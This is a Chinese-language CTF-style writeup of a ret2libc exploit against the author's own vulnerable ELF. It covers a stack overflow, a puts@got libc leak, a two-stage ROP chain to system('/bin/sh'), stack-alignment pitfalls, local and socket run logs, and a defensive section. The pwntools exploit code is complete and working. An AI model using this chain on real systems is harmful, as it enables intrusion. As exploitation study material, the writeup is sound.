# Writeup #4 · ret2libc 从本地到远程：栈对齐与 libc 反查踩坑

> 靶场：自编译 ELF（`vuln2`），NX 开启、无后门函数、只有一个小 gadget——除 ret2libc 外无路可走
> 目标：走通「泄露 libc → 反查基址 → 二次进漏洞 → ROP 拿 shell」完整链，本地与 socket 远程双模式验证
> 难度：★★☆☆☆（栈对齐部分 ★★★☆☆）
> 环境：WSL Ubuntu 24.04 / gcc 13.3.0 / glibc 2.39 / pwntools / gdb 15.1 + pwndbg / Ghidra 12.1.4 headless / radare2
> 合规声明：靶机由本人编写编译，仅本机学习，未对任何第三方系统测试

**结论先行**：
1. 泄露 libc 的唯一入口是 `puts(puts@got)`——程序启动后已调用过 `puts`，GOT 里就是真实 libc 地址；libc 版本不用猜，用 **BuildID + `readelf -sW`** 反查符号偏移。
2. 最深的坑：stage2 要垫 **2 个** `ret`，不是 1 个。第二次进入 `vuln` 是 ROP `ret` 跳回去的，栈对齐状态相对"`call` 进去"翻转了 8 字节——**每用 ROP 重入一次漏洞函数，就重新数一次栈对齐**。
3. 本地（pipe）与远程（socket）走**逐字节相同**的利用链，唯一差别是传输层。

---

## 0x00 题目设定：把除了 ret2libc 的路全部堵死

与练习 01（ret2text）完全相同的漏洞模式，但逐一堵死其他路线：

| 差异点 | 01（vuln） | 02（vuln2） | 目的 |
|---|---|---|---|
| 后门函数 | 有 `win()` 调 `system` | **无** | 二进制里不存在现成 shell 代码 |
| NX | 关（`-z execstack`，RWX 栈） | **开**（不加强制参数） | 栈不可执行，shellcode 路线堵死 |
| 需要的 gadget | 只需裸 `ret` | 需 `pop rdi ; ret` | 必须会搭 ROP 链 |
| libc | 不需要 | **必须泄露** | 训练完整利用链 |

`evidence/00-file-checksec.txt`：

```
vuln2: ELF 64-bit LSB executable, x86-64, dynamically linked, BuildID[sha1]=2c20194e...b637a, not stripped
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled          <-- 与 01 的本质区别
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
```

> 注：checksec 显示 `SHSTK/IBT: Enabled`（gcc 默认 `-fcf-protection` 写入 `.note.gnu.property`），但本机内核/glibc 未强制 shadow stack，ROP 链实际可用——实验证据见 0x06 两段实跑日志。

漏洞源码 `02-ret2libc/vuln2.c`（刻意保持 `-O0 -no-pie -fno-stack-protector`，让注意力放在利用链而不是编译期差异上）：

```c
void pop_rdi_ret(void) { __asm__ volatile ("pop %rdi\n\tret\n"); }   // 显式 gadget

void vuln(void) {
    char buf[64];
    printf("input> ");
    fflush(stdout);
    read(STDIN_FILENO, buf, 256);   /* <-- 漏洞点：256 字节读进 64 字节栈缓冲 */
    printf("you said: %s\n", buf);
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin,  NULL, _IONBF, 0);
    puts("[*] ret2libc practice: no win(), NX on, only one tiny gadget");  // ← 关键：调用了 puts
    vuln();
    puts("bye");
    return 0;
}
```

`main` 里那次 `puts` 是整个利用链的支点：它保证 `puts@got` 在我们到达 `vuln` 之前**已经被解析成真实 libc 地址**，所以后文 `puts(puts@got)` 打出来的直接就是 libc 里的地址，不需要先泄露二进制基址（PIE 关）再泄露 libc。

---

## 0x01 漏洞定位：Ghidra 反编译 + cyclic 定偏移

`evidence/ghidra-decomp.c` 里的 `vuln`：

```c
void vuln(void) {
  undefined1 local_48 [64];
  printf("input> ");
  fflush(stdout);
  read(0, local_48, 0x100);          // 256 读进 64
  printf("you said: %s\n", local_48);
}
```

`evidence/05-vuln-disasm.txt` 中 `lea rax,[rbp-0x40]; mov edx,0x100; call read@plt` 与 01 完全同构。gcc 同样给出警告（这是最好的漏洞提示器）：

```
vuln2.c:30:5: warning: 'read' writing 256 bytes into a region of size 64 [-Wstringop-overflow=]
```

偏移用 cyclic 实测（与 01 同一手法，证据见 `01-stack-overflow/evidence/cyclic-offset.txt`）：cyclic 模式输入后 gdb 看崩溃时覆盖到返回地址的位置 = **72**（`buf[64]` + `saved rbp` 8 字节）。

---

## 0x02 摸清二进制：全部地址一表打尽

No-PIE，二进制内所有地址编译后即确定，无需泄露：

| 名称 | 地址 | 来源 |
|---|---|---|
| `ret`（裸） | `0x40101a` | `evidence/03-gadgets.txt`（ROPgadget 81 条中筛选） |
| `pop rdi ; ret` | `0x4011be` | 同上 |
| `puts@plt` | `0x401084` | objdump -d |
| `puts@got` | `0x404000` | `evidence/04-got-relocations.txt`：`R_X86_64_JUMP_SLOT puts@GLIBC_2.2.5` |
| `vuln` | `0x4011c3` | nm |
| `pop_rdi_ret`（函数入口） | `0x4011b6` | nm |

`pop rdi ; ret` 来自源码里显式写的那段内联汇编函数，`evidence/06-pop_rdi-disasm.txt` 逐字节展示它为什么落在 `0x4011be`：

```
00000000004011b6 <pop_rdi_ret>:
  4011b6: f3 0f 1e fa   endbr64
  4011ba: 55            push rbp
  4011bb: 48 89 e5      mov rbp,rsp
  4011be: 5f            pop rdi        <-- 0x4011be 才是真正可用的 gadget 入口（跳过函数序言）
  4011bf: c3            ret
```

> 真实 CTF 题里这种 gadget 是"顺手捡来的"——从 `__libc_csu_init` 之类的大代码片段里翻。这里为了把注意力集中在 ROP 链本身而显式写出，**定位手法完全一样**：`ROPgadget --binary vuln2 | grep "pop rdi"`。注意入口要选对：`0x4011b6` 会带着 `push rbp` 把栈再压 8 字节，直接进 `0x4011be` 才是干净的单条 gadget。

Partial RELRO 意味着 GOT 段可读（未做 `mprotect` 只读化），`puts(puts@got)` 这条路才走得通；Full RELRO + BIND_NOW 下 GOT 同样可读，但延迟绑定已解析，结论不变。

---

## 0x03 libc 反查：BuildID + readelf，不猜版本

传统"看着像 Ubuntu 22.04 就去 libc-database 搜"的方法脆弱且不可复现。本地的做法是**按二进制里写死的 BuildID 精确反查**：

```bash
readelf -n /usr/lib/x86_64-linux-gnu/libc.so.6 | grep -i "build id"
# Build ID: a4a7992a8e66555c8141ab2a08a8465ff6e0ea65
readelf -sW /usr/lib/x86_64-linux-gnu/libc.so.6 | grep -E "puts@@|system@@|execve@@"
strings -t x /usr/lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
```

`evidence/07-libc-offsets.txt`（全过程留痕）：

```
libc: /usr/lib/x86_64-linux-gnu/libc.so.6
Build ID: a4a7992a8e66555c8141ab2a08a8465ff6e0ea65
md5: 0d071be36a77f5c2bde1023f3fa81fa0

puts@@GLIBC_2.2.5     = 0x87cc0
system@@GLIBC_2.2.5   = 0x58750
execve@@GLIBC_2.2.5   = 0xef030
"/bin/sh"            = 0x1cc42f
```

拿到运行期 `puts` 地址后一切皆可推：

```
libc_base = leak_puts - 0x87cc0
system    = libc_base + 0x58750
"/bin/sh"  = libc_base + 0x1cc42f
```

> exp 里只用了 `puts`/`system`/`"/bin/sh"` 三个偏移，但把 `execve` 也一并记录——换链时（比如 `system` 被 seccomp 挡）直接可用，不用重新查。

---

## 0x04 利用链：两段式（先泄露，再打）

为什么是两段：`main` 只调用一次 `vuln`，`read` 只有一次输入机会。所以 stage1 的 ROP 链末尾不是退出，而是**跳回 `vuln` 开头**，骗来第二次 `read`——这就是"二次进漏洞"，也是 0x05 坑的根源。

`02-ret2libc/exp_ret2libc.py` 核心：

```python
RET      = 0x40101a   # 裸 ret
POP_RDI  = 0x4011be   # pop rdi ; ret
PUTS_PLT = 0x401084   # puts@plt
PUTS_GOT = 0x404000   # puts@got
VULN     = 0x4011c3   # 回到 vuln，触发第二次 read
OFFSET   = 72

# ---- stage1：puts(puts@got) 泄露 libc，然后返回 vuln ----
payload = flat({
    OFFSET: [
        RET,        # 栈对齐：puts 入口 rsp 需 ≡ 8 (mod 16)
        POP_RDI, PUTS_GOT,
        PUTS_PLT,  # 调用 puts(PUTS_GOT)
        VULN,      # puts 返回后跳回 vuln
    ]
})
p.sendlineafter(b"input> ", payload)
p.recvuntil(b"you said: ")
p.recvline()                            # 跳过回显 "you said: AAAA..."
leak = u64(p.recv(6).ljust(8, b"\x00"))  # puts 输出 6 字节地址 + \n
```

```python
# ---- stage2：ret(对齐) + pop rdi; "/bin/sh" + system ----
payload = flat({
    OFFSET: [
        RET, RET,                       # ★ 两个 ret，理由见 0x05
        POP_RDI, libc_base + LIBC_BINSH,
        libc_base + LIBC_SYSTEM,
    ]
})
p.sendlineafter(b"input> ", payload)
p.sendline(b"id; echo ===RET2LIBC_SHELL_WORKS===")
```

几个实现细节：
- `p.recv(6)`：x86-64 Linux 用户态地址是 `0x00007f……`，高 2 字节恒为 0，`puts` 实际只打出 6 字节。取 6 字节左补零成 `u64`，比按行读更稳（行尾 `\n` 与后续输出可能粘连）。
- stage1 的 `RET`：`puts` 内部大量使用 SSE（`movaps`），入口栈必须 16 字节对齐，否则进去就崩——这是 0x05 的预演。
- libc 偏移常量与 `evidence/07-libc-offsets.txt` 一一对应，exp 注释里写明了来历，换机器只需重查三个数。

---

## 0x05 核心坑：64 位栈对齐，而且要"数两次"

### 5.1 背景：为什么 `movaps` 是无数新人的坟

System V AMD64 ABI 要求：**执行 `call` 指令时 `rsp` 必须 16 字节对齐**（`call` 压入 8 字节返回地址后，函数入口处 `rsp ≡ 8 mod 16`）。glibc 里 `system`/`printf` 等函数大量使用 SSE 指令（如 `movaps XMMWORD PTR [rsp+0x50], xmm0`），**SSE 访存要求 16 字节对齐的地址**——不对齐直接 `SIGSEGV`。

ROP 的残酷之处：一切"函数入口"都是我们的 `ret` 弹出来的，**对齐状态要自己算**。

### 5.2 01 的 baseline：垫 1 个 `ret` 才活

练习 01（ret2text 打 `win()`）留下的实验证据 `01-stack-overflow/evidence/gdb-alignment-proof.txt`：

```
############ pad ret count = 0 ############
Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7c5843b in do_system (line=0x402016 "/bin/sh") at ../sysdeps/posix/system.c:148
=> 0x7ffff7c5843b <do_system+363>: movaps XMMWORD PTR [rsp+0x50],xmm0

############ pad ret count = 1 ############
process 189 is executing new program: /usr/bin/dash      ← 活了
```

 pad72+win 直接崩，pad72+ret+win 才通。当时记下的规则：**返回地址前垫一个裸 `ret`，做 16 字节对齐**。

### 5.3 02 的新情况：第二次进 `vuln`，对齐翻了

本题要**两次经过 `vuln`**，对齐状态却不一样：

| 阶段 | 如何进入 `vuln` | 入口时 `rsp` |
|---|---|---|
| 第 1 次 | `main` 用 `call vuln` | `rsp ≡ 8 (mod 16)`（ABI 正常） |
| 第 2 次 | stage1 的 `ret` 跳回 `vuln` | `rsp ≡ 0 (mod 16)` ← **翻转了** |

原因：`call` 与 `ret` 都移动 8 字节栈指针，但它们出发时的对齐基准不同。`main` 在 16 对齐的栈上 `call`（压 8 → 入口 ≡8）；而 stage1 的 ROP 链执行到 `ret VULN` 时，栈指针位置与"call 进 vuln"相差 8，于是 `vuln` 第二次入口是 ≡0。

**后果**：stage2 若照抄 01 的经验只垫 1 个 `ret`，`system` 入口 `rsp ≡ 0`，`movaps` 必崩（症状与 5.2 的 pad0 完全一致）。必须垫 **2 个**：

```python
OFFSET: [
    RET,   # ① 把"ret 回 vuln 造成的 8 字节翻转"补回来
    RET,   # ② 常规 16 字节对齐
    POP_RDI, libc_base + LIBC_BINSH,
    libc_base + LIBC_SYSTEM,
]
```

两个 `ret` 职责不同：第一个是**还债**（抵消入口翻转），第二个才是**对齐**。这也解释了练习 01 为什么只要 1 个——它一次都没重入过。

### 5.4 可操作的规则（以后每题照做）

1. 先问自己：这个 gadget 链的目标函数，是被 `call` 进的还是被 `ret` 进的？
2. 被 `ret` 进：入口 `rsp ≡ 0 (mod 16)`；被 `call` 进：入口 `rsp ≡ 8 (mod 16)`。
3. 目标函数（`system`/`puts`/`printf`…）入口要求 ≡8；从当前状态到目标状态差几个 8，就垫几个 `ret`。
4. **每用 ROP 重入一次漏洞函数，就把第 1–3 步重做一遍**——重入会改变后续所有链的对齐基准。
5. 崩在 `movaps` / `do_system` / `printf` 内部 = 99% 是对齐，不是地址错。先数 `ret`，再查地址。

---

## 0x06 从本地到远程：换传输层，不换链

`02-ret2libc/serve.py` 在本机监听 9999，每个连接 fork 一个 `vuln2`，用两个线程做 socket↔pipe 双向转发（进程侧用 `os.read(fd)` 而非 `read(n)`，避免管道缓冲攒满才转发、让 `input> ` 这类小输出实时到达）。

```bash
cd 02-ret2libc
bash build.sh                # 编译（NX 保持开启）
python3 exp_ret2libc.py      # 本地
# 另开终端：
python3 serve.py 9999 &      # 起"远程"服务
python3 exp_ret2libc.py r    # 远程（remote("127.0.0.1", 9999)）
```

本地模式（`evidence/exp-ret2libc-local-run.log`）：

```
[x] Starting local process './vuln2': pid 55
[+] leaked puts@libc = 0x7839fc287cc0
[+] libc base       = 0x7839fc200000
[+] system@libc     = 0x7839fc258750
[+] "/bin/sh"@libc  = 0x7839fc3cc42f
uid=1001(lzq) gid=1002(lzq) groups=1002(lzq),27(sudo)
===RET2LIBC_SHELL_WORKS===
```

远程模式（`evidence/exp-ret2libc-remote-run.log`）：

```
[x] Opening connection to 127.0.0.1 on port 9999: Done
[+] leaked puts@libc = 0x73abc9887cc0
[+] libc base       = 0x73abc9800000
[+] system@libc     = 0x73abc9858750
[+] "/bin/sh"@libc  = 0x73abc99cc42f
uid=1001(lzq) gid=1002(lzq) groups=1002(lzq),27(sudo)
===RET2LIBC_SHELL_WORKS===
```

**本地与远程逐字节同链**，唯一差别是通信从 pipe 换成 TCP socket（ASLR 下每次泄露地址都不同，但 `leak - offset` 的算法与链结构不变）。这验证了一件重要的事：**泄露链的正确性与传输层无关**——把 `remote()` 的目标换成真实靶机地址，exp 本体一行不用改。

---

## 0x07 工具链踩坑（三个小的，但都浪费时间）

| # | 坑 | 现象 | 解法 |
|---|---|---|---|
| 1 | **Ghidra headless 不吃中文路径** | `analyzeHeadless` 退出码 1、Java 堆栈异常。经 ASCII junction（`D:\rev`）中转也没用——junction 解析后仍升回真实中文路径 `D:\逆向\...`，Ghidra 12.x 在此环境下不稳 | 先把二进制复制到纯 ASCII 目录再 `-import`（`Copy-Item ... D:\m3test\vuln2`），产出即 `evidence/ghidra-decomp.c` |
| 2 | **`checksec` 在非交互脚本里 not found** | `bash script.sh` 是非 login shell，不含 `~/.local/bin`，证据文件一度只留下一行 `checksec: command not found` | 采集脚本开头 `export PATH="$HOME/.local/bin:$PATH"` |
| 3 | **exec 层吞掉 `2>/dev/null`** | `ROPgadget --binary vuln2 2>/dev/null \| grep ... > evidence/03-gadgets.txt` 生成 **0 字节**文件 | 重定向先落中间文件再逐步 grep；`head -n` 代替 `head -N`。**证据文件生成后必须检查非空**——0 字节证据等于没有证据 |

---

## 0x08 通用步骤（以后每道 ret2libc 照此走）

1. `checksec` + `nm` + `ROPgadget`：摸清缓解措施与可用 gadget，地址列表一表打尽；
2. 反编译确认溢出点，cyclic 定偏移（`buf[64]` + `rbp` = 72）；
3. 找一个"能打印指针"的函数（`puts`/`write`/`printf`）+ 对应 GOT 项，做任意地址读泄露 libc；
4. `泄露值 − 已知符号偏移 = libc base`，再算 `system` 与 `"/bin/sh"`；
5. 第二次进漏洞函数搭 `pop rdi` 链；**每次重入都重新数栈对齐**，垫够 `ret`（0x05.4 规则）；
6. 本地 `process()` 调通后换 `remote()`，验证与传输层无关，再考虑换真实目标。

---

## 0x09 防御视角（站在开发者角度）

- **根因是溢出本身**（`read(0, buf, 256)` 进 `char buf[64]`），NX/PIE/CFI 全都只是抬高成本。修复就一句话：限制读取长度，或使用带长度的安全 API。
- `No canary found` 是第一道失守——金丝雀本可以直接断掉这条链；
- `No PIE` 让二进制地址全裸奔，省掉了攻击者一次泄露；PIE + Full RELRO + 收敛泄露面（启动路径上不给人"打印指针"的机会）才能使本题的 stage1 失效；
- 但正如本题所示：**任何单点缓解都有对应的绕过手法**，防御必须是多层叠加 + 根因修复。

---

## 附录 A · 文件清单

```
pwn-practice/
├── README.md                       # 仓库总览 + 三个最值得记住的坑
├── Writeup-04-ret2libc.md          # 本文（作品集 #4）
├── 00-crackme-static-analysis/     # Ghidra+radare2 交叉分析（四段式报告）
├── 01-stack-overflow/              # ret2text：栈对齐的 baseline 实验在此
│   └── evidence/gdb-alignment-proof.txt   # pad ret = 0 崩 / = 1 活 的实证
└── 02-ret2libc/                    # 本题
    ├── vuln2.c / vuln2             # 源码 + 编译产物
    ├── build.sh                    # 编译脚本（刻意不加 -z execstack）
    ├── exp_ret2libc.py             # 两段式利用（local / remote）
    ├── serve.py                    # 本地 socket 服务端，模拟远程环境
    ├── report.md                   # 四段式内部报告（scope/evidence/conclusion/reproduction）
    └── evidence/                   # 所有工具原始输出，报告结论逐条可回溯
        ├── 00-file-checksec.txt         # file + md5 + checksec + BuildID
        ├── 01-nm-symbols.txt
        ├── 02-objdump-disasm.txt
        ├── 03-gadgets.txt               # 从 81 条 gadget 中筛选
        ├── 04-got-relocations.txt       # puts@got / read@got
        ├── 05-vuln-disasm.txt
        ├── 06-pop_rdi-disasm.txt        # pop rdi; ret gadget 落地反汇编
        ├── 07-libc-offsets.txt          # BuildID + 符号偏移 + "/bin/sh" 偏移
        ├── exp-ret2libc-local-run.log
        ├── exp-ret2libc-remote-run.log
        └── ghidra-decomp.c
```

## 附录 B · 一分钟复现

```bash
cd practice/pwn-practice/02-ret2libc
bash build.sh
python3 exp_ret2libc.py            # 本地：应看到 uid=... 与 ===RET2LIBC_SHELL_WORKS===
python3 serve.py 9999 &            # 另开终端
python3 exp_ret2libc.py r          # 远程：同样的链，同样的 shell
```

---

*配套阅读：[01-stack-overflow](../01-stack-overflow/report.md)（栈对齐 baseline）、[pwn-practice 总览](../README.md)（三个最值得记住的坑）。*
